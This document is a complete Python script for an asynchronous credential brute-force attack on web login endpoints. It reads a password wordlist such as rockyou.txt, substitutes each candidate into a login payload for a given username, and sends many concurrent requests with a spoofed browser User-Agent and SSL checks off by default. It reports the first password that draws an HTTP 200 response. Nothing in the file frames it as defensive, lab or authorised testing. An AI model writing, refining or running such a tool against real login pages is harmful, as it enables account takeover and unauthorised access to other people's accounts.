#!/usr/bin/env python3
"""
Async HTTP login brute-forcer
--------------------------------
Purpose:
  Attempt to guess a user’s password by brute-forcing via HTTP requests
  (POST/GET JSON or form-data) asynchronously.

Usage example:
  python brute_forcer.py https://target.com/login \
      -u user@mail.com \
      -w rockyou.txt \
      --form '{"email":"^USER^","password":"^PASS^"}' \
      -m POST -t 50 --timeout 5

Placeholders:
  ^USER^  -> will be replaced by the username supplied via -u
  ^PASS^  -> will be replaced by each password candidate from the wordlist
"""

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------
import argparse         # CLI argument parsing
import asyncio          # Async runtime
import json             # JSON payload encoding
import signal           # Graceful ctrl-c handling (not yet wired)
import sys
from pathlib import Path
from typing import List, Optional

import aiohttp          # High-performance async HTTP client
from colorama import init, Fore   # Cross-platform coloured terminal
from tqdm import tqdm   # Progress bar

# -----------------------------------------------------------------------------
# Colourama initialisation (makes colours auto-reset after each print)
# -----------------------------------------------------------------------------
init(autoreset=True)
GREEN = Fore.GREEN


# -----------------------------------------------------------------------------
# Core Worker Class
# -----------------------------------------------------------------------------
class PasswordGuesser:
    """
    Handles the entire brute-force lifecycle:
      - Load wordlist
      - Build per-request payloads
      - Fire async requests
      - Stop on first success
    """

    def __init__(
        self,
        url: str,
        username: str,
        wordlist: Path,
        payload_tpl: str,
        method: str = "POST",
        threads: int = 20,
        timeout: int = 5,
        verify_ssl: bool = False,
    ):
        """
        Parameters
        ----------
        url : str
            Full login endpoint, e.g. https://site.com/api/login
        username : str
            Known username or email for the account
        wordlist : Path
            Text file containing one candidate password per line
        payload_tpl : str
            Template string with ^USER^ and ^PASS^ placeholders.
            Can be JSON (`{"u":"^USER^","p":"^PASS^"}`) or
            urlencoded form (`u=^USER^&p=^PASS^`)
        method : str
            HTTP method – only "POST" or "GET" supported
        threads : int
            Maximum concurrent requests (semaphore size)
        timeout : int
            Total seconds to wait for each HTTP request
        verify_ssl : bool
            Enforce SSL certificate validity (default False to reduce friction)
        """
        self.url = url
        self.username = username

        # Load passwords into memory (strip whitespace & drop empty lines)
        self.passwords: List[str] = [
            p.strip()
            for p in wordlist.read_text(encoding="utf-8", errors="ignore").splitlines()
            if p.strip()
        ]
        self.payload_tpl = payload_tpl
        self.method = method.upper()
        self.threads = threads
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.verify_ssl = verify_ssl

        # Default spoofed UA – change if target blocks it
        self.headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/114.0 Safari/537.36"
            )
        }

    # ------------------------------------------------------------------
    # Payload Builder
    # ------------------------------------------------------------------
    def _payload(self, pwd: str) -> dict:
        """
        Replace placeholders and return either:
          - A dict (ready for JSON) OR
          - A dict (ready for form-urlencoded)
        depending on the template format.

        Rules:
          - If template starts with '{' treat as JSON string
          - Otherwise treat as urlencoded form (k=v&k2=v2)
        """
        raw = self.payload_tpl.replace("^USER^", self.username).replace("^PASS^", pwd)

        # JSON branch
        if raw.startswith("{"):
            return json.loads(raw)

        # Form branch
        return dict(kv.split("=", 1) for kv in raw.split("&"))

    # ------------------------------------------------------------------
    # Async Task: single login attempt
    # ------------------------------------------------------------------
    async def _try_login(
        self,
        session: aiohttp.ClientSession,
        password: str,
        sem: asyncio.Semaphore,
        pbar: tqdm,
    ) -> Optional[str]:
        """
        Attempt one login.

        Returns the password on success (HTTP 200) or None otherwise.
        """
        async with sem:  # Respect concurrency limit
            try:
                pl = self._payload(password)

                # Decide where to place payload based on method
                async with session.request(
                    self.method,
                    self.url,
                    json=pl if self.method == "POST" else None,
                    params=pl if self.method == "GET" else None,
                    timeout=self.timeout,
                    ssl=self.verify_ssl,
                ) as resp:
                    # Naïve success criterion: 200 OK
                    if resp.status == 200:
                        pbar.close()  # Stop progress bar
                        print(f"{GREEN}[+] Password found: {password}")
                        return password
            except Exception:
                # Any network / timeout / SSL error -> ignore
                pass

            pbar.update(1)
            return None

    # ------------------------------------------------------------------
    # Main Loop
    # ------------------------------------------------------------------
    async def run(self) -> Optional[str]:
        """
        Create semaphore & aiohttp session, then launch all tasks.
        Cancels remaining tasks as soon as the correct password is found.
        """
        # Concurrency guard
        sem = asyncio.Semaphore(self.threads)

        # Connector with per-host limit
        connector = aiohttp.TCPConnector(
            limit_per_host=self.threads, ssl=self.verify_ssl
        )

        # Shared aiohttp session
        async with aiohttp.ClientSession(
            headers=self.headers, connector=connector
        ) as session:
            # Create tqdm progress bar
            with tqdm(total=len(self.passwords), desc="Guessing", unit="pw") as pbar:
                # Schedule all coroutines
                tasks = [
                    asyncio.create_task(self._try_login(session, p, sem, pbar))
                    for p in self.passwords
                ]

                # As each task finishes, inspect result
                for fut in asyncio.as_completed(tasks):
                    try:
                        result = await fut
                    except asyncio.CancelledError:
                        continue  # An already-cancelled task
                    if result:
                        # Success – cancel remaining tasks & return
                        for t in tasks:
                            if not t.done():
                                t.cancel()
                        return result
        # Exhausted wordlist
        return None


# -----------------------------------------------------------------------------
# CLI Parser
# -----------------------------------------------------------------------------
def parse_cli() -> argparse.Namespace:
    """
    Build and return CLI argument namespace.
    """
    parser = argparse.ArgumentParser(description="Async HTTP login brute-forcer")
    parser.add_argument("url", help="Login endpoint URL")
    parser.add_argument("-u", "--username", required=True, help="Username or e-mail")
    parser.add_argument(
        "-w",
        "--wordlist",
        type=Path,
        required=True,
        help="Text file with one password per line",
    )
    parser.add_argument(
        "--form",
        default='{"email":"^USER^","password":"^PASS^"}',
        help=(
            'Payload template with ^USER^ and ^PASS^ placeholders. '
            'JSON object or urlencoded form string (k=v&k2=v2)'
        ),
    )
    parser.add_argument(
        "-m",
        "--method",
        choices=["POST", "GET"],
        default="POST",
        help="HTTP method",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=20,
        help="Max concurrent requests (default: 20)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Per-request timeout in seconds (default: 5)",
    )
    parser.add_argument(
        "--verify-ssl",
        action="store_true",
        help="Verify SSL certificates (default: ignore)",
    )
    return parser.parse_args()


# -----------------------------------------------------------------------------
# Entry-point
# -----------------------------------------------------------------------------
def main():
    """
    Parse CLI, instantiate PasswordGuesser, and run the event loop.
    """
    args = parse_cli()
    guesser = PasswordGuesser(
        args.url,
        args.username,
        args.wordlist,
        args.form,
        args.method,
        args.threads,
        args.timeout,
        args.verify_ssl,
    )
    try:
        asyncio.run(guesser.run())
    except KeyboardInterrupt:
        print("\n[!] Aborted by user")


if __name__ == "__main__":
    main()
